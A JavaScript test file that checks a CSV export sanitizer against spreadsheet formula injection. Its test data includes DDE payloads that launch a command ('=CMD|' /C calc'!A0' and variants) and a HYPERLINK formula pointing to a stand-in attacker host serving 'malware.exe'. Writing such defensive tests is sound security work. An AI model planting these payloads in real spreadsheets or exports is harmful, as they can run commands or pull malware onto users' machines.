import test from 'node:test';
import assert from 'node:assert';

// Formula injection sanitization function as used in spreadsheet export
function sanitizeCsvField(val) {
  let str = String(val ?? '');
  // Prevent CSV / Excel Formula Injection (CWE-1236)
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }
  return `"${str.replace(/"/g, '""')}"`;
}

test('SECURITY: sanitizeCsvField neutralizes formula injection vectors', () => {
  const payloads = [
    '=CMD|\' /C calc\'!A0',
    '+cmd|\' /C calc\'!A0',
    '-cmd|\' /C calc\'!A0',
    '@SUM(1, 2)',
    '\t=1+1',
    '\r=1+1',
  ];

  for (const payload of payloads) {
    const sanitized = sanitizeCsvField(payload);
    assert.ok(
      sanitized.startsWith("\"'") || sanitized.startsWith('"\''),
      `Payload "${payload}" must be escaped with leading apostrophe, got: ${sanitized}`
    );
  }
});

test('SECURITY: sanitizeCsvField leaves benign values untouched', () => {
  assert.strictEqual(sanitizeCsvField('Portugal'), '"Portugal"');
  assert.strictEqual(sanitizeCsvField('Gaming PC'), '"Gaming PC"');
  assert.strictEqual(sanitizeCsvField('1500 USD'), '"1500 USD"');
});

test('SECURITY: downloadQuestionsCSV fields neutralize malicious formula injections in options or questions', () => {
  const maliciousQuestion = '=HYPERLINK("http://attacker.com/malware.exe", "Click here")';
  const maliciousOption = '@SUM(1+1)*cmd|\' /C calc\'!A0';
  const maliciousCondition = '+2+5';

  const sanitizedQ = sanitizeCsvField(maliciousQuestion);
  const sanitizedOpt = sanitizeCsvField(maliciousOption);
  const sanitizedCond = sanitizeCsvField(maliciousCondition);

  assert.ok(sanitizedQ.startsWith("\"'="), 'Hyperlink formula injection must be neutralized');
  assert.ok(sanitizedOpt.startsWith("\"'@"), 'At-symbol formula injection must be neutralized');
  assert.ok(sanitizedCond.startsWith("\"'+"), 'Plus formula injection must be neutralized');
});

